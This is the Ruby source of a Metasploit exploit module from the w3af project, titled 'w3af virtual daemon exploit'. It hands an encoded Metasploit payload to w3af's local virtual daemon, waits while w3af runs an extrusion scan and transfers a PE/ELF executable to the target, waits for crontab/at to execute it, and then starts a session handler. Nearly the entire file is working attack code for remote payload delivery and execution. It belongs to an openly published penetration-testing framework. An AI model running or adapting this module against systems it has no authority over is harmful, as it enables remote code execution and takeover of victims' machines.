'''
w3af_vdaemon.rb

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''


require 'msf/core'

module Msf

class Exploits::Unix::Misc::W3af_vdaemon < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'w3af virtual daemon exploit',
			'Description'    => %q{
				This module is used to link metasploit and w3af together.
			},
			'Author'         => 'Andres Riancho',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 1 $',
			'References'     => 
				[ 
					['URL', 'http://w3af.sourceforge.net/']
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'payload',
				},
			
			'Payload' =>
					{
							'Space'       => 8000,
							'DisableNops' => true,
					},
			
			'Targets'        =>
				[
					['Windows',     { 'Platform' => 'win' } ],
					['Linux',     { 'Platform' => 'linux' } ]
				],

			'Privileged'     => true,

			'DefaultTarget' => 0))
			
			register_options(
				[
					Opt::RHOST('172.16.1.128')
				], self.class)
				
			deregister_options('RPORT')

	end
	
	def recvWaitTime( theSocket )
		data = theSocket.get_once( 2 , 5 )
		return data.to_i
	end
	
	def waitForData( waitTime, theSocket )
		sleep( waitTime )
		
		# This loop is to receive the "<go>" sent by w3af
		data = theSocket.get_once( 4 , 2 )
		#print_status("Received outside the loop: #{data}")
		
		while data == nil
			print_status("Waiting...")
			data = theSocket.get_once( 4 , 2 )
			#print_status("Received in loop: #{data}")
		end
		
		theSocket.put('<doneWaiting>')
		
		return data
	end
	
	def exploit
		# Connect to the vdaemon and send the payload	
		vdaemonSock = connect(false, { 'RPORT' => 9091 , 'RHOST' => '127.0.0.1' })
		# Say hi!
		vdaemonSock.put('<metasploit-w3af-link>')
		
		remoteIP = vdaemonSock.get_once
		print_status("The remote IP address is: #{remoteIP}")
		print_status("Using remote IP address to create payloads.")
		
		vdaemonSock.put(payload.encoded.length.to_s.rjust(4))
		vdaemonSock.put(payload.encoded)
		print_status("Sent payload to vdaemon.")

		response = recvWaitTime( vdaemonSock )
		print_status("The estimated time to wait for the extrusion scan to complete is: #{response} seconds.")
		waitForData( response, vdaemonSock )
		print_status("Done waiting!")
		
		response = recvWaitTime( vdaemonSock )
		print_status("The estimated time to wait for PE/ELF transfer is: #{response} seconds.")
		waitForData( response, vdaemonSock )
		print_status("Done waiting!")
		
		# Get how much time to wait
		response = recvWaitTime( vdaemonSock )
		
		# wait for the crontab/at to run
		print_status("Going to wait for #{response} seconds (waiting for crontab/at to execute payload).")
		print_status("The session could start before the handler, so please *be patient*.")
		#waitForData( response.to_i, vdaemonSock )
		sleep( response.to_i )
		print_status("Done waiting!")
		
		print_status("Starting handler")
		handler

		disconnect
	end

end
end
